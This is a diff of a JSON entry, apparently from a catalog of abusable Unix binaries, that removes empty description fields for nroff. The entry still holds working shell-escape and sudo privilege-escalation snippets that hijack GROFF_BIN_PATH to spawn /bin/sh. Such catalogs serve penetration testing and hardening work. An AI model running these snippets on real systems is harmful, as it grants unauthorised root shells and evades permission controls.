@@ -8,13 +8,13 @@
     ],
     "shell": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nGROFF_BIN_PATH=$TF nroff\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
       }
     ]
